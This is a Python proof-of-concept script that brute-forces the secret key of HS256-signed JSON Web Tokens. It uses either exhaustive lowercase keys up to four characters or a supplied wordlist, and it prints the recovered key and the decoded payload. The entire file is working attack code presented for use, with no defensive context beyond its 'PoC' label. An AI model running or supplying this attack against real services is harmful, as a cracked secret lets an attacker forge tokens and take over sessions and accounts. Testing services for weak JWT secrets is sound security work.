# jwt_attack_demo.py
"""
PoC: Brute Force JWT Secret Attack
Author: [Your Name]
"""

import jwt
import itertools
import string
import argparse
import sys
from jwt.exceptions import InvalidSignatureError

def generate_keys():
    chars = string.ascii_lowercase
    for length in range(1, 5):  # try keys from 1 to 4 chars
        for key in itertools.product(chars, repeat=length):
            yield ''.join(key)

def load_wordlist(wordlist_path):
    with open(wordlist_path, "r", encoding="utf-8") as f:
        for line in f:
            yield line.strip()

def brute_force_jwt(token, key_source):
    for idx, key in enumerate(key_source, 1):
        try:
            decoded = jwt.decode(token, key, algorithms=["HS256"])
            print(f"[+] Found key: {key}")
            print(f"[+] Payload: {decoded}")
            return True
        except InvalidSignatureError:
            if idx % 10000 == 0:
                print(f"[*] Tried {idx} keys so far...", flush=True)
            continue
        except Exception as e:
            print(f"[!] Unexpected error with key '{key}': {e}", file=sys.stderr)
            continue
    print("[-] Key not found.")
    return False

def main():
    parser = argparse.ArgumentParser(description="Brute-force attack on JWT secret key.")
    parser.add_argument("token", help="JWT token string")
    parser.add_argument("-w", "--wordlist", help="Path to wordlist file (optional)")
    args = parser.parse_args()

    if args.wordlist:
        key_source = load_wordlist(args.wordlist)
    else:
        key_source = generate_keys()

    brute_force_jwt(args.token, key_source)

if __name__ == "__main__":
    main()

# Install pyjwt using pip
# pip install pyjwt
